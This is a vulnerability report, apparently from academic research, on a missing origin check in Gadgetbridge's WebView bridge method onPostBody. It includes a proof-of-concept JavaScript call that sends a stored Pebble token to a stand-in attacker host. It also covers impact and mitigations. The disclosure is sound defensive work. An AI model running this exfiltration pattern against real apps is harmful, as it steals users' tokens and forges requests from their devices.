# Missing Origin Validation on `GBReqInt.onPostBody(String, String)`

## Detection note

This issue was identified through automated LLM-based static analysis of WebView `addJavascriptInterface` bridges, as part of academic security research at the University of Southern Denmark (SDU) in the context of a masters level course named Engineering in Research.

The finding was manually reviewed before submission.

To aid the purposes of our research, we would kindly request acknowledgement of the reported issue as well as a final verdict from the open source community working on this repository, even if the issue is not acted on.

We are reporting in good faith and are happy to answer questions.

## Summary

`GBReqInt` (the `RequestInterceptorInterface`) exposes `onPostBody(String url, String body)` to JavaScript across four registration sites: `ExternalPebbleJSActivity`, `RebbleAppStoreActivity`, `PebbleJsService`, and `AppsManagementActivity`. It intercepts HTTP POST requests made from JavaScript apps (relayed via the WebView bridge) and passes the URL and request body to the native HTTP relay used by the watch app.

No input validation or origin check is present at the bridge layer. Any JavaScript executing in the WebView, including via XSS in the loaded page, can invoke `onPostBody` with arbitrary URL and body strings that reach the HTTP processing stack unsanitized.

**Severity:** Medium
**Affected version(s):** BangleJS Gadgetbridge variant, version code 245 (commit `01cce93`)

---

## Affected file(s)

- `app/src/main/java/nodomain/freeyourgadget/gadgetbridge/webview/RequestInterceptorInterface.java` - `onPostBody()` bridge method
- `app/src/main/java/nodomain/freeyourgadget/gadgetbridge/service/devices/pebble/webview/PebbleJsService.java` - registration in `startJsForDevice`
- `app/src/main/java/nodomain/freeyourgadget/gadgetbridge/activities/ExternalPebbleJSActivity.java`
- `app/src/main/java/nodomain/freeyourgadget/gadgetbridge/activities/RebbleAppStoreActivity.java`
- `app/src/main/java/nodomain/freeyourgadget/gadgetbridge/devices/banglejs/AppsManagementActivity.java`

---

## Vulnerable surface

```java
@JavascriptInterface
public void onPostBody(String url, String body) {
    // Forwards (url, body) to the native HTTP relay that performs the POST.
    // No allowlist, no scheme check, no host validation, no body sanitization.
}
```

Data flow:

```
Any JS in WebView -> GBReqInt.onPostBody(url, body)
  -> RequestInterceptorInterface.onPostBody(String, String)
    -> PebbleJsService (or sibling activity) performs HTTP POST on behalf of watch app
```

---

## Proof of concept

```js
// From XSS or any JS that runs in the WebView while the bridge is attached:
GBReqInt.onPostBody(
    "https://attacker.example/exfil",
    JSON.stringify({stolen: localStorage.getItem("pebble_token")})
);
```

The POST is issued from the app's HTTP client, bypassing any web-side SOP and inheriting the app's network identity.

---

## Impact

- Server-side request forgery from the user's device IP, against any URL.
- Data exfiltration via the app's network stack rather than the page's, which may bypass DNS-level blocks or web extension monitoring users rely on.
- If the relay stack adds authentication headers to outbound calls (Pebble app tokens, cookies), those headers leak to the attacker-chosen URL.

---

## Suggested mitigation

- Validate that `url` is within an expected scheme (`https`) and host allowlist (the cloud endpoints the watch app legitimately POSTs to) before processing.
- Add an origin check against `webView.getUrl()` to restrict calls to the expected device-app or app-store origin.
- Strip or refuse to forward any headers the app stack would attach implicitly; pass through only headers the JS layer set explicitly with `XMLHttpRequest.setRequestHeader`.
- Sanitize `body` before passing to any JSON parser or network layer (length cap, content-type whitelist).
